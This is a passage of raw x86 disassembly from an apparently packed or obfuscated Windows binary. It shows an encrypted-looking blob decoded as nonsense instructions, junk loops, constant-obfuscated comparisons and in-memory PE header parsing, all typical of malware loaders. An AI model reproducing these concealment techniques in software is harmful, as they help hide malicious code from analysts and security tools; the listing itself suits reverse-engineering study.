  40c652:	sbb    eax,DWORD PTR [ebx+0x4a]
  40c655:	pop    ebx
  40c656:	push   es
  40c657:	les    esi,FWORD PTR [edx]
  40c659:	mov    ah,0x5b
  40c65b:	or     BYTE PTR [ebp+eiz*8-0x63],dh
  40c65f:	imul   esi,DWORD PTR [ebx-0x45151cdf],0xb00a99d
  40c669:	sbb    eax,0x69a08723
  40c66e:	push   edi
  40c66f:	mov    esi,0x1683ea44
  40c674:	xor    DWORD PTR [ebp-0x3d],ebp
  40c677:	leave  
  40c678:	(bad)  
  40c679:	mov    BYTE PTR [ebx],al
  40c67b:	mov    ch,0x6a
  40c67d:	shl    DWORD PTR [edx-0x1f],cl
  40c680:	cld    
  40c681:	stc    
  40c682:	addr16 int 0xff
  40c685:	push   esi
  40c686:	in     al,0x56
  40c688:	jb     0x40c6a6
  40c68a:	inc    esi
  40c68b:	mov    ebx,0xb4870926
  40c690:	push   edx
  40c691:	mov    es,WORD PTR [eax-0x57]
  40c694:	jb     0x40c681
  40c696:	sbb    esi,DWORD PTR [edi]
  40c698:	push   esp
  40c699:	dec    ebx
  40c69a:	xlat   BYTE PTR ds:[ebx]
  40c69b:	xchg   ecx,eax
  40c69c:	cwde   
  40c69d:	leave  
  40c69e:	stc    
  40c69f:	(bad)  
  40c6a0:	xor    bl,BYTE PTR [esi+0x20]
  40c6a3:	or     al,0x4d
  40c6a5:	pop    eax
  40c6a6:	data16 je 0x40c6b8
  40c6a9:	ss daa 
  40c6ab:	pop    esp
  40c6ac:	jb     0x40c63e
  40c6ae:	pop    ds
  40c6af:	jns    0x40c710
  40c6b1:	pusha  
  40c6b2:	ds xor ebp,eax
  40c6b5:	ins    BYTE PTR es:[edi],dx
  40c6b6:	sub    BYTE PTR ds:0x3d9793a,dh
  40c6bc:	add    edx,DWORD PTR [edx-0x4095242f]
  40c6c2:	adc    dl,ah
  40c6c4:	fist   DWORD PTR [edi+0x4f475f02]
  40c6ca:	or     edi,ebx
  40c6cc:	dec    eax
  40c6cd:	pop    es
  40c6ce:	cmp    BYTE PTR [eax-0x56347b93],dl
  40c6d4:	jge    0x40c745
  40c6d6:	pop    ecx
  40c6d7:	add    ah,BYTE PTR [eax]
  40c6d9:	jge    0x40c6ee
  40c6db:	(bad)  
  40c6dc:	mov    ebp,0xef961c15
  40c6e1:	lds    esp,FWORD PTR [ebx]
  40c6e3:	xchg   ah,al
  40c6e5:	adc    DWORD PTR [edx],esi
  40c6e7:	xor    BYTE PTR [ebp+0x7a],0xbd
  40c6eb:	add    ah,cl
  40c6ed:	retf   0x56f1
  40c6f0:	adc    al,0x61
  40c6f2:	leave  
  40c6f3:	and    ah,al
  40c6f5:	std    
  40c6f6:	xchg   edx,eax
  40c6f7:	ja     0x40c71c
  40c6f9:	push   0x55ac36ec
  40c6fe:	fwait
  40c6ff:	pusha  
  40c700:	(bad)  
  40c701:	loope  0x40c71a
  40c703:	(bad)  
  40c704:	mov    dh,0xe1
  40c706:	mov    dh,0x47
  40c708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c709:	ds xchg ebx,ebp
  40c70c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c70d:	mov    al,ds:0xe22ee280
  40c712:	xchg   esi,eax
  40c713:	inc    eax
  40c714:	jo     0x40c6a9
  40c716:	gs dec eax
  40c718:	daa    
  40c719:	jo     0x40c71c
  40c71b:	mov    dh,0x73
  40c71d:	xchg   edx,eax
  40c71e:	out    0xa1,eax
  40c720:	xchg   esi,eax
  40c721:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c722:	inc    ebp
  40c723:	(bad)  
  40c724:	int3   
  40c725:	retf   0xdf1d
  40c728:	mov    bl,BYTE PTR [ecx]
  40c72a:	pop    ss
  40c72b:	push   ss
  40c72c:	dec    edx
  40c72d:	mov    ?,WORD PTR [edi+eax*8]
  40c730:	add    bl,0xa1
  40c733:	(bad)  
  40c734:	fmulp  st(5),st
  40c736:	adc    dh,BYTE PTR [esp+eiz*8-0x4c]
  40c73a:	xor    edi,DWORD PTR [ecx]
  40c73c:	push   eax
  40c73d:	repz ds test eax,0x420295f9
  40c744:	fadd   QWORD PTR [edx-0x16]
  40c747:	out    dx,al
  40c748:	in     eax,0x8a
  40c74a:	and    DWORD PTR [esi+ebx*1+0x59],ebx
  40c74e:	mov    ch,0x38
  40c750:	std    
  40c751:	add    DWORD PTR [esi+0x6468d08],ecx
  40c757:	or     DWORD PTR [edx+0x4334d99],0xffffff92
  40c75e:	mov    eax,DWORD PTR [esi]
  40c760:	ss fwait
  40c762:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c763:	call   0xa5f31efa
  40c768:	pop    esp
  40c769:	cwde   
  40c76a:	mov    ebx,0x59f2d0e5
  40c76f:	push   esp
  40c770:	(bad)
  40c773:	cli    
  40c774:	not    BYTE PTR [ebx]
  40c776:	inc    ecx
  40c777:	ss int 0x87
  40c77a:	push   0x86189a8a
  40c77f:	out    0xba,al
  40c781:	sub    al,BYTE PTR [ebx-0x10]
  40c784:	mov    ah,BYTE PTR [ebx-0x2e]
  40c787:	retf   
  40c788:	mov    ebx,DWORD PTR [ebx+0x45664a3]
  40c78e:	cdq    
  40c78f:	bound  ebp,QWORD PTR [ebx-0x24e0f7dd]
  40c795:	push   ebp
  40c796:	(bad)  
  40c797:	xor    BYTE PTR ds:0x5f6bcf3a,cl
  40c79d:	(bad)  
  40c79e:	loopne 0x40c7b9
  40c7a0:	stos   DWORD PTR es:[edi],eax
  40c7a1:	jo     0x40c755
  40c7a3:	add    BYTE PTR [esi],dl
  40c7a5:	or     eax,0x49611c6d
  40c7aa:	or     eax,DWORD PTR [eax-0x36146568]
  40c7b0:	cmp    ebx,DWORD PTR [edi+ebx*8]
  40c7b3:	sub    al,0x3a
  40c7b5:	lods   eax,DWORD PTR ds:[esi]
  40c7b6:	mov    ah,BYTE PTR [ecx-0x5c]
  40c7b9:	mov    DWORD PTR [ebp+eiz*8+0x33fcc5a6],ebx
  40c7c0:	ret    0x1c24
  40c7c3:	int3   
  40c7c4:	out    dx,al
  40c7c5:	arpl   di,di
  40c7c7:	in     al,dx
  40c7c8:	daa    
  40c7c9:	je     0x40c797
  40c7cb:	(bad)  
  40c7cc:	cs mov ebp,0xa643ba7c
  40c7d2:	ds push ss
  40c7d4:	rcr    BYTE PTR [ecx-0x7407b275],0x9
  40c7db:	mov    eax,DWORD PTR [eax+ecx*1]
  40c7de:	mov    DWORD PTR [ebp-0x20],eax
  40c7e1:	mov    eax,DWORD PTR [ebp+0x8]
  40c7e4:	xor    eax,esi
  40c7e6:	add    eax,edi
  40c7e8:	mov    DWORD PTR [ebp-0x24],eax
  40c7eb:	mov    eax,DWORD PTR [ebp+0x8]
  40c7ee:	jmp    0x40cb3b
  40c7f3:	mov    ecx,0xbd47bdf8
  40c7f8:	inc    ebx
  40c7f9:	inc    ecx
  40c7fa:	or     BYTE PTR [eax],0xac
  40c7fd:	data16 (bad) 
  40c7ff:	popa   
  40c800:	mov    dh,0xa8
  40c802:	test   al,0xc9
  40c804:	cmp    BYTE PTR [esi+0x7e],0x2e
  40c808:	jge    0x40c888
  40c80a:	jle    0x40c86e
  40c80c:	loopne 0x40c80a
  40c80e:	inc    esi
  40c80f:	add    edx,DWORD PTR [ecx+ecx*4]
  40c812:	int    0x7d
  40c814:	gs addr16 or eax,0x13c688d6
  40c81b:	add    bl,BYTE PTR [edx]
  40c81d:	ins    BYTE PTR es:[edi],dx
  40c81e:	fucomip st,st(7)
  40c820:	push   ebp
  40c821:	and    eax,0x81691c4e
  40c826:	ror    BYTE PTR [ecx+ebp*2+0x35],0xee
  40c82b:	js     0x40c89d
  40c82d:	idiv   BYTE PTR [edx]
  40c82f:	add    eax,0x4e0dc7ec
  40c834:	and    bh,al
  40c836:	push   eax
  40c837:	fcomip st,st(2)
  40c839:	inc    eax
  40c83a:	jmp    0xacfd1c73
  40c83f:	dec    ebp
  40c840:	mov    eax,0xf1f80796
  40c845:	test   al,0x77
  40c847:	(bad)  
  40c848:	aaa    
  40c849:	ins    DWORD PTR es:[edi],dx
  40c84a:	ds cwde 
  40c84c:	mov    eax,0x6948904b
  40c851:	jns    0x40c8be
  40c853:	popf   
  40c854:	lahf   
  40c855:	ficom  WORD PTR [edx]
  40c857:	repnz dec esp
  40c859:	mov    ch,0xb7
  40c85b:	repnz mov ebp,0xe4cba80b
  40c861:	mov    ah,0xb7
  40c863:	je     0x40c7f2
  40c865:	mov    ebx,0xa559e6b9
  40c86a:	bnd jge 0x40c8d8
  40c86d:	rcr    ah,0x81
  40c870:	stos   BYTE PTR es:[edi],al
  40c871:	es pop esp
  40c873:	inc    ecx
  40c874:	sub    ecx,DWORD PTR ds:0xede522b9
  40c87a:	push   ss
  40c87b:	loopne 0x40c877
  40c87d:	sbb    edx,DWORD PTR [esi+0x73]
  40c880:	es mov cl,0xfe
  40c883:	mov    BYTE PTR ds:0x7f33c150,cl
  40c889:	pushf  
  40c88a:	paddb  mm5,QWORD PTR [ecx-0x56]
  40c88e:	(bad)  
  40c88f:	jmp    0xca19:0x70ea03cb
  40c896:	ins    BYTE PTR es:[edi],dx
  40c897:	push   es
  40c898:	mov    bl,0x57
  40c89a:	jb     0x40c8fa
  40c89c:	cdq    
  40c89d:	cwde   
  40c89e:	daa    
  40c89f:	adc    edx,ecx
  40c8a1:	dec    ebp
  40c8a2:	xchg   BYTE PTR [edx+0x13],bh
  40c8a5:	stos   DWORD PTR es:[edi],eax
  40c8a6:	xor    BYTE PTR [edi+0x5a359c7b],0xcf
  40c8ad:	cmp    edx,esi
  40c8af:	or     BYTE PTR [edx+0x55ad3276],0x12
  40c8b6:	push   ecx
  40c8b7:	inc    eax
  40c8b8:	xlat   BYTE PTR ds:[ebx]
  40c8b9:	mov    eax,0x1e15618a
  40c8be:	push   ebp
  40c8bf:	adc    DWORD PTR [ecx+0x4b366bcf],0xcd10fadd
  40c8c9:	fsub   QWORD PTR [ebp+0x4d]
  40c8cc:	sar    DWORD PTR [esp+eiz*4+0x34a55208],1
  40c8d3:	xchg   edi,eax
  40c8d4:	push   cs
  40c8d5:	pop    ebp
  40c8d6:	or     esp,DWORD PTR [ecx]
  40c8d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8d9:	lds    ebp,FWORD PTR [esi+0x546640f9]
  40c8df:	ins    BYTE PTR es:[edi],dx
  40c8e0:	in     eax,dx
  40c8e1:	repnz iret 
  40c8e3:	sub    BYTE PTR [eax+eax*1-0x6],dh
  40c8e7:	jmp    0xc99a8ec7
  40c8ec:	iret   
  40c8ed:	xor    BYTE PTR ds:0x1a580187,bl
  40c8f3:	out    0x4d,eax
  40c8f5:	pop    ecx
  40c8f6:	(bad)
  40c8f9:	(bad)  
  40c8fa:	mov    cl,0x49
  40c8fc:	mov    edi,0x182fc64
  40c901:	cmp    BYTE PTR [edi-0x374c4955],0xd7
  40c908:	ins    BYTE PTR es:[edi],dx
  40c909:	jmp    0x40c8d4
  40c90b:	cmp    ebx,DWORD PTR ds:0xd310a9ff
  40c911:	call   0x2339c9dd
  40c916:	ja     0x40c992
  40c918:	xor    al,ch
  40c91a:	(bad)  
  40c91b:	ret    
  40c91c:	xor    al,0x6d
  40c91e:	push   esp
  40c91f:	retf   
  40c920:	inc    esp
  40c921:	jl     0x40c8b5
  40c923:	loop   0x40c8d7
  40c925:	out    dx,eax
  40c926:	leave  
  40c927:	pop    esi
  40c928:	shl    BYTE PTR [eax-0x4e3fd7ad],1
  40c92e:	idiv   al
  40c930:	mov    edi,0xf33191f4
  40c935:	repnz pop edx
  40c937:	je     0x40c97d
  40c939:	push   0x86ce14f4
  40c93e:	test   al,0xd3
  40c940:	push   ebp
  40c941:	mov    dh,0x13
  40c943:	mov    ds:0xf99d38a6,al
  40c948:	and    dl,BYTE PTR [esi+0x62]
  40c94b:	out    dx,eax
  40c94c:	sti    
  40c94d:	sub    edx,DWORD PTR [ebx-0x3380116d]
  40c953:	mov    ch,0xaa
  40c955:	imul   edi,DWORD PTR [ebx],0x38
  40c958:	mov    ss,WORD PTR [ebx]
  40c95a:	pop    ebp
  40c95b:	pop    es
  40c95c:	jb     0x40c972
  40c95e:	mov    dh,bh
  40c960:	cs daa 
  40c962:	scas   eax,DWORD PTR es:[edi]
  40c963:	stc    
  40c964:	sti    
  40c965:	repz ss xor eax,0xed322a08
  40c96c:	add    al,0x21
  40c96e:	add    eax,0x51ded955
  40c973:	out    0x8b,al
  40c975:	push   esp
  40c976:	(bad)  
  40c977:	je     0x40c976
  40c979:	out    dx,al
  40c97a:	push   esi
  40c97b:	push   ecx
  40c97c:	fimul  WORD PTR [edi]
  40c97e:	data16 outs dx,BYTE PTR ds:[esi]
  40c980:	pop    esi
  40c981:	out    0xc3,eax
  40c983:	xor    esi,DWORD PTR [ecx]
  40c985:	aas    
  40c986:	lods   eax,DWORD PTR ds:[esi]
  40c987:	push   ecx
  40c988:	dec    esp
  40c989:	push   esp
  40c98a:	push   0x10
  40c98c:	repz inc edx
  40c98e:	sub    ch,dl
  40c990:	dec    edx
  40c991:	push   ebp
  40c992:	xor    BYTE PTR [eax+0x4f],dh
  40c995:	adc    DWORD PTR [esi+0x34],edx
  40c998:	xor    eax,DWORD PTR ds:0xaac8d39a
  40c99e:	(bad)  
  40c99f:	mov    ecx,0x21f1753b
  40c9a4:	pop    ss
  40c9a5:	mov    ds:0x225dd3b7,al
  40c9aa:	pop    ebx
  40c9ab:	rol    ebp,cl
  40c9ad:	xchg   ebx,eax
  40c9ae:	mov    bl,cl
  40c9b0:	add    eax,0x39ba2bc7
  40c9b5:	mov    ecx,0x39149f3d
  40c9ba:	adc    al,0x40
  40c9bc:	pop    esp
  40c9bd:	jl     0x40c97b
  40c9bf:	mov    edx,0x59a14709
  40c9c4:	dec    ebp
  40c9c5:	cs cld 
  40c9c7:	mov    edx,0x83af209
  40c9cc:	and    ecx,DWORD PTR [edx]
  40c9ce:	stc    
  40c9cf:	xchg   DWORD PTR [eax-0x50],edi
  40c9d2:	mov    ebx,0x689e11c2
  40c9d7:	popf   
  40c9d8:	sub    cl,BYTE PTR [ebx]
  40c9da:	cwde   
  40c9db:	and    BYTE PTR [ecx+0x7784f7f9],dl
  40c9e1:	repz loopne 0x40ca27
  40c9e4:	sbb    DWORD PTR [ecx+0x5],ecx
  40c9e7:	jns    0x40c9fa
  40c9e9:	je     0x40c9de
  40c9eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9ec:	lods   al,BYTE PTR ds:[esi]
  40c9ed:	and    al,0x3b
  40c9ef:	repz int 0xfc
  40c9f2:	mov    ah,0xa6
  40c9f4:	xchg   edx,eax
  40c9f5:	jne    0x40c9b1
  40c9f7:	add    eax,0x7dae39b1
  40c9fc:	mov    dh,BYTE PTR [ecx]
  40c9fe:	int    0x76
  40ca00:	aam    0x90
  40ca02:	dec    edx
  40ca03:	push   ebx
  40ca04:	xlat   BYTE PTR ds:[ebx]
  40ca05:	stos   BYTE PTR es:[edi],al
  40ca06:	mov    eax,0xc98ba214
  40ca0b:	addr16 sub eax,0x36a7c6b5
  40ca11:	and    ah,BYTE PTR [esi]
  40ca13:	outs   dx,BYTE PTR ds:[esi]
  40ca14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca15:	aaa    
  40ca16:	or     esp,DWORD PTR [esi]
  40ca18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca19:	call   0xcd17:0xcd562bd6
  40ca20:	pop    ss
  40ca21:	and    BYTE PTR [ecx],cl
  40ca23:	jno    0x40ca54
  40ca25:	mov    ah,0x2f
  40ca27:	push   0x877982c6
  40ca2c:	and    edi,DWORD PTR [edi-0x4f]
  40ca2f:	push   es
  40ca30:	jo     0x40ca05
  40ca32:	cmc    
  40ca33:	inc    ebx
  40ca34:	arpl   WORD PTR [eax],ax
  40ca36:	rol    esp,1
  40ca38:	test   DWORD PTR [edi+0x66],esp
  40ca3b:	dec    esi
  40ca3c:	mov    DWORD PTR [ebx+0x31242842],edx
  40ca42:	fdiv   st,st(1)
  40ca44:	and    cl,0xa5
  40ca47:	sub    eax,0xdcf0a27f
  40ca4c:	mov    dl,0x27
  40ca4e:	dec    BYTE PTR [edi-0x2b12262d]
  40ca54:	push   esi
  40ca55:	jbe    0x40c9db
  40ca57:	repz lds eax,FWORD PTR [esi+eax*8-0x6e321c4d]
  40ca5f:	cmp    BYTE PTR [edi-0x2c],dh
  40ca62:	and    BYTE PTR [ebx+0x79dd596b],ch
  40ca68:	inc    esp
  40ca69:	cli    
  40ca6a:	dec    eax
  40ca6b:	scas   eax,DWORD PTR es:[edi]
  40ca6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca6d:	cwde   
  40ca6e:	jns    0x40cad1
  40ca70:	call   0x3344:0x939d1313
  40ca77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca78:	or     eax,0xbe832a64
  40ca7d:	rcl    esi,1
  40ca7f:	hlt    
  40ca80:	mov    cl,0xaf
  40ca82:	jne    0x40ca94
  40ca84:	inc    edx
  40ca85:	mov    eax,0xce0b03d2
  40ca8a:	mov    ds:0x93b581cb,al
  40ca8f:	sub    eax,0x8b07c6e4
  40ca94:	in     al,0xa9
  40ca96:	sbb    bh,ah
  40ca98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca99:	out    0x72,al
  40ca9b:	adc    al,0xb
  40ca9d:	xchg   DWORD PTR [edi+0x6cf94f76],ebx
  40caa3:	pop    ds
  40caa4:	ins    DWORD PTR es:[edi],dx
  40caa5:	ds adc al,0xe9
  40caa8:	scas   al,BYTE PTR es:[edi]
  40caa9:	les    ebp,FWORD PTR [ecx-0x5716cfdc]
  40caaf:	rcl    BYTE PTR [ecx-0x815532e],0x9a
  40cab6:	jmp    0xd1080a7d
  40cabb:	push   es
  40cabc:	out    0x9d,eax
  40cabe:	or     eax,esi
  40cac0:	in     eax,dx
  40cac1:	xchg   edx,eax
  40cac2:	repz cmp eax,0x3f554fa0
  40cac8:	jo     0x40ca7a
  40caca:	cmp    eax,DWORD PTR [esi]
  40cacc:	or     DWORD PTR [edi-0x54],esi
  40cacf:	arpl   WORD PTR [esi-0x7e0963a2],di
  40cad5:	loope  0x40cb42
  40cad7:	loopne 0x40caaa
  40cad9:	xor    eax,DWORD PTR [esi]
  40cadb:	cmp    esi,DWORD PTR [edx+0x25]
  40cade:	xchg   esp,eax
  40cadf:	jl     0x40cb0d
  40cae1:	dec    ebx
  40cae2:	outs   dx,BYTE PTR ds:[esi]
  40cae3:	adc    BYTE PTR [ecx-0x31],al
  40cae6:	test   eax,ebp
  40cae8:	cwde   
  40cae9:	lods   eax,DWORD PTR ds:[esi]
  40caea:	inc    eax
  40caeb:	aas    
  40caec:	ins    BYTE PTR es:[edi],dx
  40caed:	mov    al,ds:0xa17f3854
  40caf2:	nop
  40caf3:	outs   dx,BYTE PTR ds:[esi]
  40caf4:	pop    ds
  40caf5:	ror    DWORD PTR [edi+0x48755731],0xbc
  40cafc:	sub    BYTE PTR [ebx+edi*1-0x25],al
  40cb00:	mov    ah,0xc4
  40cb02:	imul   eax,DWORD PTR [ebp+edi*1-0x64],0x6e
  40cb07:	ins    DWORD PTR es:[edi],dx
  40cb08:	std    
  40cb09:	inc    edx
  40cb0a:	das    
  40cb0b:	sub    al,0x26
  40cb0d:	fdivp  st(6),st
  40cb0f:	cmp    eax,0x47025a36
  40cb14:	into   
  40cb15:	out    dx,eax
  40cb16:	mov    dl,0x92
  40cb18:	dec    esp
  40cb19:	cld    
  40cb1a:	pop    ebp
  40cb1b:	cmp    al,BYTE PTR [esi-0x7a0dccf4]
  40cb21:	adc    eax,0xbdde0b4d
  40cb26:	mov    bh,0x61
  40cb28:	jno    0x40cb6a
  40cb2a:	cmp    DWORD PTR ss:[ecx-0x4f815a2a],eax
  40cb31:	jns    0x40cb59
  40cb33:	and    al,0x66
  40cb35:	(bad)  
  40cb36:	cmp    BYTE PTR [eax],cl
  40cb38:	sub    eax,0x4d8b0668
  40cb3d:	loopne 0x40cb72
  40cb3f:	mov    BYTE PTR [ebx],0xc7
  40cb42:	cmp    ecx,eax
  40cb44:	je     0x40cba4
  40cb4a:	mov    eax,DWORD PTR [ebp-0x8]
  40cb4d:	mov    ecx,DWORD PTR [ebp-0x20]
  40cb50:	add    ecx,DWORD PTR [eax]
  40cb52:	mov    DWORD PTR [ebp-0x24],ecx
  40cb55:	mov    eax,DWORD PTR [ebp-0x24]
  40cb58:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb5b:	mov    eax,DWORD PTR [eax+0xc]
  40cb5e:	mov    ecx,DWORD PTR [ecx]
  40cb60:	mov    al,BYTE PTR [eax+ecx*1]
  40cb63:	add    al,0x38
  40cb65:	xor    al,0x46
  40cb67:	cmp    al,0xc5
  40cb69:	je     0x40cb80
  40cb6f:	mov    eax,DWORD PTR [ebp+0x8]
  40cb72:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb75:	xor    eax,esi
  40cb77:	add    eax,edi
  40cb79:	mov    DWORD PTR [ecx],eax
  40cb7b:	jmp    0x40cba4
  40cb80:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40cb87:	jmp    0x40cba4
  40cb8c:	mov    eax,DWORD PTR [ebp-0x8]
  40cb8f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40cb92:	mov    ecx,DWORD PTR [ecx]
  40cb94:	mov    DWORD PTR [eax],ecx
  40cb96:	mov    eax,DWORD PTR [ebp+0xc]
  40cb99:	mov    eax,DWORD PTR [ebp+0x8]
  40cb9c:	push   DWORD PTR [ebp-0x8]
  40cb9f:	call   0x401000
  40cba4:	mov    eax,DWORD PTR [ebp-0xc]
  40cba7:	cmp    eax,ebx
  40cba9:	je     0x40b333
  40cbaf:	mov    eax,DWORD PTR [ebp-0x8]
  40cbb2:	mov    eax,DWORD PTR [eax]
  40cbb4:	pop    edi
  40cbb5:	pop    esi
  40cbb6:	pop    ebx
  40cbb7:	leave  
  40cbb8:	ret    0x8
  40cbbb:	push   ebp
  40cbbc:	mov    ebp,esp
  40cbbe:	push   ecx
  40cbbf:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cbc6:	and    DWORD PTR ds:0x430455,0x0
  40cbd0:	jmp    0x40cbe0
  40cbd5:	mov    eax,ds:0x430455
  40cbda:	inc    eax
  40cbdb:	mov    ds:0x430455,eax
  40cbe0:	cmp    DWORD PTR ds:0x430455,0x1f
  40cbe7:	jae    0x40cc78
  40cbed:	cmp    DWORD PTR ds:0x430455,0x10
  40cbf4:	jne    0x40cc05
  40cbfa:	push   0x2023
  40cbff:	call   DWORD PTR ds:0x42ea0b
  40cc05:	cmp    DWORD PTR ds:0x430455,0xf
  40cc0c:	jne    0x40cc20
  40cc12:	xor    eax,eax
  40cc14:	xor    eax,DWORD PTR ds:0x430455
  40cc1a:	inc    eax
  40cc1b:	mov    ds:0x430455,eax
  40cc20:	jmp    0x40cbd5
  40cc25:	and    DWORD PTR ds:0x43043d,0x0
  40cc2f:	mov    eax,ds:0x43043d
  40cc34:	inc    eax
  40cc35:	mov    ds:0x43043d,eax
  40cc3a:	cmp    DWORD PTR ds:0x43043d,0x29
  40cc41:	jne    0x40cc6b
  40cc47:	push   DWORD PTR [ebp-0x18]
  40cc4a:	push   DWORD PTR [ebp-0x10]
  40cc4d:	push   0x42e917
  40cc52:	push   0x5c7c
  40cc57:	push   0x209d
  40cc5c:	push   DWORD PTR [ebp-0x1c]
  40cc5f:	push   DWORD PTR [ebp-0x18]
  40cc62:	push   DWORD PTR [ebp-0x24]
  40cc65:	call   DWORD PTR ds:0x42eacb
  40cc6b:	cmp    DWORD PTR ds:0x43043d,0x1e
  40cc72:	jb     0x40cc2f
  40cc78:	mov    eax,DWORD PTR [ebp+0x8]
  40cc7b:	mov    al,BYTE PTR [eax]
  40cc7d:	add    al,0x38
  40cc7f:	xor    al,0x46
  40cc81:	cmp    al,0xc3
  40cc83:	jne    0x40ccc8
  40cc89:	mov    eax,DWORD PTR [ebp+0x8]
  40cc8c:	mov    ecx,DWORD PTR [ebp+0x8]
  40cc8f:	add    ecx,DWORD PTR [eax+0x3c]
  40cc92:	mov    edx,0x7510854
  40cc97:	mov    DWORD PTR [ebp+0x8],ecx
  40cc9a:	mov    eax,DWORD PTR [ebp-0x4]
  40cc9d:	xor    eax,edx
  40cc9f:	push   esi
  40cca0:	mov    esi,DWORD PTR [ebp+0x8]
  40cca3:	mov    ecx,0x32729b
  40cca8:	add    eax,ecx
  40ccaa:	cmp    DWORD PTR [esi+0x54],eax
  40ccad:	pop    esi
  40ccae:	je     0x40ccbc
  40ccb4:	mov    eax,DWORD PTR [ebp+0x8]
  40ccb7:	jmp    0x40ccd5
  40ccbc:	mov    eax,DWORD PTR [ebp-0x4]
  40ccbf:	xor    eax,edx
  40ccc1:	add    eax,ecx
  40ccc3:	jmp    0x40ccd5
  40ccc8:	mov    eax,DWORD PTR [ebp-0x4]
  40cccb:	xor    eax,0x7510854
  40ccd0:	add    eax,0x32729b
  40ccd5:	leave  
  40ccd6:	ret    0x4
  40ccd9:	push   ebp
  40ccda:	mov    ebp,esp
  40ccdc:	mov    eax,ds:0x41222c
  40cce1:	mov    edx,0x32729b
  40cce6:	sub    eax,edx
  40cce8:	mov    ecx,0x7510854
  40cced:	push   esi
  40ccee:	inc    esi
  40ccef:	mov    esi,DWORD PTR [ebp+0xc]
  40ccf2:	or     DWORD PTR ds:0x42e7cc,0x4ea0
  40ccfc:	xor    eax,ecx
  40ccfe:	cmp    eax,esi
  40cd00:	mov    DWORD PTR ds:0x4304d7,0x1f44
  40cd0a:	je     0x40cda9
  40cd10:	mov    esi,DWORD PTR ds:0x42ee59
  40cd16:	mov    eax,ds:0x43047d
  40cd1b:	sub    esi,eax
  40cd1d:	imul   esi,DWORD PTR [esi+eax*1]
  40cd21:	mov    eax,ds:0x412224
  40cd26:	and    esi,DWORD PTR ds:0x42edd7
  40cd2c:	mov    esi,DWORD PTR [ebp+0xc]
  40cd2f:	sub    eax,edx
  40cd31:	sbb    DWORD PTR ds:0x43046d,0x6758
  40cd3b:	xor    eax,ecx
  40cd3d:	mov    DWORD PTR ds:0x4304e7,0x7cb5
  40cd47:	cmp    eax,esi
  40cd49:	mov    DWORD PTR ds:0x42e7c0,0x28eb
  40cd53:	jne    0x40cd7d
  40cd59:	mov    eax,ds:0x41222c
  40cd5e:	xor    DWORD PTR ds:0x430471,0x42edcf
  40cd68:	add    eax,DWORD PTR ds:0x412224
  40cd6e:	mov    DWORD PTR ds:0x430439,0x6115
  40cd78:	jmp    0x40cd93
  40cd7d:	sbb    eax,0x6db0
  40cd82:	mov    eax,DWORD PTR [ebp+0xc]
  40cd85:	adc    DWORD PTR ds:0x43043d,0x430449
  40cd8f:	xor    eax,ecx
  40cd91:	add    eax,edx
  40cd93:	mov    ds:0x412224,eax
  40cd98:	mov    eax,DWORD PTR [ebp+0xc]
  40cd9b:	xor    eax,ecx
  40cd9d:	add    eax,edx
  40cd9f:	mov    ds:0x41222c,eax
  40cda4:	jmp    0x40cdb3
  40cda9:	mov    eax,ds:0x41222c
  40cdae:	mov    ds:0x412224,eax
  40cdb3:	mov    eax,DWORD PTR [ebp+0x8]
  40cdb6:	mov    eax,DWORD PTR [eax]
  40cdb8:	mov    ecx,DWORD PTR ds:0x412224
  40cdbe:	add    DWORD PTR [eax],ecx
  40cdc0:	pop    esi
  40cdc1:	pop    ebp
  40cdc2:	ret    0x8
  40cdc5:	push   ebp
  40cdc6:	mov    ebp,esp
  40cdc8:	sub    esp,0x30
  40cdcb:	sbb    eax,DWORD PTR ds:0x42edcb
  40cdd1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cdd8:	and    DWORD PTR ds:0x430449,0x0
  40cde2:	mov    eax,ds:0x430449
  40cde7:	inc    eax
  40cde8:	mov    ds:0x430449,eax
  40cded:	cmp    DWORD PTR ds:0x430449,0x18
  40cdf4:	jne    0x40ce06
  40cdfa:	push   DWORD PTR [ebp-0x10]
  40cdfd:	push   DWORD PTR [ebp-0x1c]
  40ce00:	call   DWORD PTR ds:0x42eacf
  40ce06:	cmp    DWORD PTR ds:0x430449,0x13
  40ce0d:	jb     0x40cde2
  40ce13:	adc    DWORD PTR ds:0x42edd7,0x4965
  40ce1d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40ce24:	mov    ecx,DWORD PTR [ebp-0x4]
  40ce27:	sub    DWORD PTR ds:0x4304cf,0x97c
  40ce31:	push   ebx
  40ce32:	adc    ebx,eax
  40ce34:	mov    eax,0x7510854
  40ce39:	xor    ecx,eax
  40ce3b:	add    ebx,0x6e38
  40ce41:	mov    ebx,0x32729b
  40ce46:	add    ecx,ebx
  40ce48:	mov    DWORD PTR [ebp-0x1c],ecx
  40ce4b:	and    ecx,0x1130
  40ce51:	mov    ecx,DWORD PTR [ebp+0x14]
  40ce54:	sub    DWORD PTR ds:0x42ede3,0x4304df
  40ce5e:	push   esi
  40ce5f:	push   edi
  40ce60:	test   ecx,ecx
  40ce62:	mov    DWORD PTR ds:0x42e7cc,0x9d3
  40ce6c:	je     0x40cf83
  40ce72:	mov    DWORD PTR ds:0x43043d,0x17
  40ce7c:	cmp    DWORD PTR ds:0x43043d,0x0
  40ce83:	je     0x40cf64
  40ce89:	cmp    DWORD PTR ds:0x43043d,0x5
  40ce90:	jne    0x40ced0
  40ce96:	push   0x56ae
  40ce9b:	push   DWORD PTR [ebp-0x28]
  40ce9e:	push   0x17dc
  40cea3:	push   0x51d4
  40cea8:	push   DWORD PTR [ebp-0x28]
